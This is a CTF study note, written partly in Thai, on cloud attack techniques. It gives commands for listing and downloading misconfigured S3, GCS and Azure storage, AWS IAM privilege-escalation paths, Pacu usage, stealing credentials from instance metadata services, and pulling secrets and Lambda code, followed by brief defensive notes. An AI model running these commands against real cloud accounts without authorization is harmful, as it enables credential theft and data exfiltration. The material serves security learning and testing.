---
tags: [ctf, cloud, aws, gcp, azure]
created: 2026-05-02
---

# ☁️ Cloud Security

> Cloud CTF challenges เน้น: misconfigured S3/storage, IAM privilege escalation, metadata abuse, leaked credentials, K8s misconfig

---

## 🎯 ประเภทโจทย์

### Public misconfig
- S3 bucket / GCS bucket / Azure blob → public read/write
- Open ElasticSearch, MongoDB, Redis (no auth)
- Exposed Kubernetes dashboard

### IAM Privilege Escalation
- ได้ low-priv credentials → escalate
- ใช้ services (Lambda, EC2, IAM) ที่ have higher perms

### Metadata Service Abuse (SSRF chain)
- ดู [../03-Web-Exploitation/SSRF#Cloud Metadata](../03-Web-Exploitation/SSRF.md#cloud-metadata)
- 169.254.169.254: IAM credentials, instance info

### Container Escape
- ดู [Container-Security](Container-Security.md)

---

## 🛠 Tools Stack

### General
| Tool | Cloud |
|------|-------|
| **aws-cli** | AWS |
| **gcloud** | GCP |
| **az** | Azure |
| **kubectl** | Kubernetes |
| **terraform** | IaC |

### Pentesting
| Tool | ใช้ทำอะไร |
|------|----------|
| **Pacu** ⭐ | AWS exploitation framework |
| **ScoutSuite** | Multi-cloud auditing |
| **CloudMapper** | Visualize AWS environment |
| **CloudFox** | AWS pentesting helper |
| **enumerate-iam** | AWS IAM enum |
| **kube-hunter** | K8s vulnerabilities |
| **kubectl-who-can** | K8s RBAC check |
| **peirates** | K8s pentesting |

---

## 🪣 S3 / Cloud Storage Misconfigs

### Find buckets
```bash
# Direct guess
https://<name>.s3.amazonaws.com/
https://s3.amazonaws.com/<name>/

# Enumeration
aws s3 ls s3://target-bucket/ --no-sign-request
aws s3api get-bucket-location --bucket target-bucket --no-sign-request

# Tools
# Bucket Stream: github.com/eth0izzle/bucket-stream
# S3Scanner: github.com/sa7mon/S3Scanner
```

### Common bucket names to try
```
<company>
<company>-backup
<company>-prod
<company>-dev
<company>-data
<company>-uploads
<company>-assets
<company>-static
<company>-logs
<company>-private
<company>-2023, -2024, etc.
backup-<company>
```

### Misconfigurations
- Bucket public read → list + download
- Bucket public write → upload (defacement, malware delivery)
- ACL misconfig
- Bucket policy weak
- Pre-signed URL leak

### Example
```bash
# List bucket without creds
aws s3 ls s3://target-bucket/ --no-sign-request --recursive

# Download all files
aws s3 sync s3://target-bucket/ ./loot/ --no-sign-request

# Try to write
echo "test" > test.txt
aws s3 cp test.txt s3://target-bucket/test.txt --no-sign-request
```

### GCP Storage
```bash
gsutil ls gs://target-bucket/
gsutil cp -r gs://target-bucket/* ./loot/
```

### Azure Blob
```bash
az storage blob list --container-name target --account-name targetaccount
```

---

## 🔑 AWS IAM

### Identify Identity
ถ้าได้ AWS credentials (access_key_id + secret):
```bash
# Configure
aws configure
# Or via env
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...

# Identify
aws sts get-caller-identity
```

### Enumerate permissions
```bash
# Try common APIs (some will fail)
aws iam get-user
aws iam list-attached-user-policies --user-name <user>
aws iam list-groups-for-user --user-name <user>
aws iam list-roles
aws iam list-users
aws iam list-policies --scope Local

# Use enumerate-iam (smart bruteforce)
git clone https://github.com/andresriancho/enumerate-iam
python enumerate-iam.py --access-key AKIA... --secret-key ...
```

### Look for privilege escalation
**Common privesc paths:**
1. **iam:CreateAccessKey** + target user → create new key for higher-priv user
2. **iam:AttachUserPolicy / AttachRolePolicy** → attach AdministratorAccess
3. **iam:PassRole + EC2/Lambda/ECS** → run service as priv role
4. **lambda:CreateFunction + iam:PassRole** → run code as role
5. **iam:CreatePolicyVersion + SetDefaultPolicyVersion** → modify policy
6. **iam:UpdateAssumeRolePolicy** → trust your own user

### Pacu: auto everything
```bash
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
python pacu.py

> import_keys default
> set_keys                    # set your stolen keys
> run iam__enum_permissions
> run iam__privesc_scan       # auto try all privesc
> run ec2__check_termination_protection
```

### S3 backdoor
```bash
# If you have iam:AttachUserPolicy, attach AdminAccess to your user
aws iam attach-user-policy --user-name yourname --policy-arn arn:aws:iam: aws:policy/AdministratorAccess
```

---

## 🎯 EC2 Metadata Service

### IMDSv1 (legacy, often still enabled)
```bash
# From inside EC2 instance OR via SSRF
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

ได้ JSON:
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}
```

→ Use these creds (short-lived, ~6 hours) → priv escalate

### IMDSv2 (token-based, harder)
```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

→ SSRF can still hit IMDSv2 if HTTP method PUT supported (Gopher protocol)

### GCP metadata
```bash
curl http://metadata.google.internal/computeMetadata/v1/ \
    -H "Metadata-Flavor: Google"

curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \
    -H "Metadata-Flavor: Google"
```

→ Token for service account → use with gcloud

### Azure metadata
```bash
curl "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
    -H "Metadata: true"

curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
    -H "Metadata: true"
```

---

## 🌐 Public Cloud APIs

### Lambda functions exposed
```bash
aws lambda list-functions
aws lambda get-function --function-name <name>
# Download code:
aws lambda get-function --function-name <name> --query 'Code.Location' | xargs curl -o code.zip
```

→ Code may have hardcoded secrets

### Secrets Manager / Parameter Store
```bash
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <name>

aws ssm get-parameters --names <param>
aws ssm get-parameters-by-path --path "/" --recursive
```

### CloudWatch Logs (info disclosure)
```bash
aws logs describe-log-groups
aws logs filter-log-events --log-group-name <name>
```

### EBS snapshot (public misconfigured)
```bash
# Find public snapshots
aws ec2 describe-snapshots --filters "Name=is-public,Values=true"
aws ec2 describe-snapshots --owner-ids <target-account-id>

# Mount snapshot to your instance → access data
```

---

## ⚙️ GitHub / GitLab Leaks

ใน CTF (and real life): credentials leak in:
- Git history (deleted file ที่ commit ไปแล้ว)
- Public repos
- GitLab CI logs

### Tools
- **TruffleHog** ⭐: github.com/trufflesecurity/trufflehog
- **GitLeaks**
- **GitGrabber**

```bash
# Trufflehog scan repo
trufflehog git https://github.com/<user>/<repo>

# Scan all files in current dir
trufflehog filesystem .
```

### Common exposed secrets
- AWS access keys (`AKIA...`)
- Slack tokens (`xoxb-...`, `xoxp-...`)
- GitHub tokens (`ghp_...`)
- Stripe keys (`sk_live_...`)
- Twilio
- SendGrid

---

## 🔥 Common CTF Patterns

### Pattern 1: SSRF → metadata → AWS pwn
1. Find SSRF (web app)
2. Hit 169.254.169.254 → IAM credentials
3. Use with aws-cli → enumerate
4. Find s3 bucket, secrets, lambda code → flag

### Pattern 2: Public S3 with .env
1. List S3 buckets (guess names)
2. Download .env file
3. Use credentials → other services → flag

### Pattern 3: Leaked git secrets
1. Get repo URL (from web app, github org)
2. TruffleHog → find AWS keys
3. Use keys → enumerate → flag

### Pattern 4: Lambda code review
1. List lambda functions
2. Download code
3. Read source: hardcoded keys, logic flaws
4. Trigger function with payload → flag

### Pattern 5: K8s metadata
ดู [Container-Security](Container-Security.md)

---

## 🔍 Cloud-specific recon

### AWS
```bash
# Detect AWS service
dig <subdomain>          # AWS-* CNAMEs
nslookup <subdomain>     # cloudfront.net, elb.amazonaws.com

# Subdomain takeover (S3, CloudFront, etc.)
# Check CNAME → if pointing to non-existent S3 bucket → register it
```

### GCP
- Domain in `googleapis.com`?
- `*.appspot.com` = App Engine
- `*.run.app` = Cloud Run

### Azure
- `*.azurewebsites.net` = App Service
- `*.cloudapp.net` = older
- `*.blob.core.windows.net` = Blob storage

---

## 🛡 Defensive Notes

(สำหรับเข้าใจ: ของจริงไม่ค่อยใส่ใน CTF)

- IAM least privilege
- IMDSv2 enforced (no v1)
- VPC endpoints (no metadata over public)
- S3 block public access
- CloudTrail enabled
- GuardDuty / Security Hub
- SCP (Service Control Policies) at org level

---

## 🔗 ต่อไป

- [Containers + K8s ลึก](Container-Security.md)

## 📚 References

- "Hands-On AWS Penetration Testing": Karl Gilbert
- HackTricks Cloud section
- AWS Security Workshops (free): workshops.aws
- pwnedlabs.io (free + paid cloud labs)
- HackTheBox cloud track

---

#ctf #cloud #aws #gcp #azure
